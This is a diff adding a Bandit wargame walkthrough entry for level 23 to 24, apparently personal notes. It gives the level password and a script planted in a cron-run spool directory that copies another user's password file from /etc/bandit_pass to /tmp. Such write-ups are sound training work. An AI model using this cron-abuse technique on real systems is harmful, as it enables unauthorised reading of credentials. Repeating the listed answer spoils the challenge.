@@ -337,6 +337,30 @@ procedure : same as bandit 23
 
 
 
+Level 23 -> Level 24
+password for next level : UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+ 
+procedure:
+
+$ nano /var/spool/bandit24/test.sh
+  #!/bin/bash
+    myname=$(whoami)
+    echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+    cat /etc/bandit_pass/$myname > /tmp/asdfasdfasdfaasdadsfasdfasdfasdfsadfasdfasdfsadfsad
+$ chmod 777 /var/spool/bandit24/test.sh
+wait for some time and
+
+$ cat /tmp/asdfasdfasdfaasdadsfasdfasdfasdfsadfasdfasdfsadfsad
+
+
+
+Level 24 -> Level 25
+
+
+
+
+
+
 
 
 
